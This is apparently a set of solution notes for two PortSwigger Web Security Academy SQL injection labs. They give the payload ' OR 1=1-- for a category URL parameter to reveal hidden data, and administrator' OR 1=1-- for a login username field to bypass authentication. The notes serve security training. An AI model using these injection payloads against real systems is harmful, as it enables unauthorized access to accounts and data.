###### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
URL: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

Endpoint: category=

Steps:
```
1. Click on any filter item.
2. Insert the following payload in the url: category=' OR 1=1--
```


###### Lab: SQL injection vulnerability allowing login bypass
URL: https://portswigger.net/web-security/sql-injection/lab-login-bypass

Endpoint: username

Steps:
```
1. Go to login section.
2. Insert the following in the username section: administrator' OR 1=1--
```

